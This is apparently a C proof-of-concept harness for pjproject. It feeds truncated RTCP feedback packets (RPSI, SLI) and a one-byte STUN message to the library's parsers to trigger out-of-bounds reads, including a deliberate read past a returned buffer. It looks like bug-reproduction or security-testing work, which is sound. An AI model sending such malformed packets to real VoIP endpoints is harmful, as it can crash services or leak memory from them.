#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pj/types.h>

#include <pj/pool.h>
#include <pjmedia/rtcp_fb.h>
#include <pjnath/stun_msg.h>


int main(int argc, char **argv) {
    int which = atoi(argv[1]);
    if (which == 1) {  /* RPSI: L=1, exact 12-byte allocation */
        unsigned char *buf = malloc(12);
        memset(buf, 0, 12);
        buf[0] = 0x80 | 3; buf[1] = 206; buf[2] = 0x00; buf[3] = 0x01; /* FMT=3, PT=PSFB, length=1 */
        pjmedia_rtcp_fb_rpsi rpsi;
        pj_status_t st = pjmedia_rtcp_fb_parse_rpsi(buf, 12, &rpsi);
        printf("RPSI ret=%d slen=%lu\n", (int)st, (unsigned long)rpsi.rpsi.slen);
        if (st == PJ_SUCCESS && rpsi.rpsi.slen > 12) {  /* poisoned descriptor: read one byte per the API contract */
            printf("first byte beyond: %d\n", rpsi.rpsi.ptr[16]);
        }
        free(buf);
    } else if (which == 2) {  /* SLI: L=1, 12 bytes */
        unsigned char *buf = malloc(12);
        memset(buf, 0, 12);
        buf[0] = 0x80 | 2; buf[1] = 206; buf[2] = 0x00; buf[3] = 0x01; /* FMT=2, PT=PSFB, length=1 */
        pjmedia_rtcp_fb_sli sli[1000];
        unsigned cnt = 1000;
        pj_status_t st = pjmedia_rtcp_fb_parse_sli(buf, 12, &cnt, sli);
        printf("SLI ret=%d cnt=%u\n", (int)st, cnt);
        free(buf);
    } else {  /* STUN: 1-byte pdu, no CHECK_PACKET */
        pj_caching_pool cp; pj_pool_t *pool;
        pj_init(); pj_caching_pool_init(&cp, &pj_pool_factory_default_policy, 0);
        pool = pj_pool_create(&cp.factory, "t", 1024, 1024, NULL);
        unsigned char *pdu = malloc(1); pdu[0] = 0x00;
        pj_stun_msg *msg; pj_size_t parsed = 0;
        pj_status_t st = pj_stun_msg_decode(pool, pdu, 1, 0, &msg, &parsed, NULL);
        printf("STUN ret=%d\n", (int)st);
        free(pdu);
    }
    return 0;
}
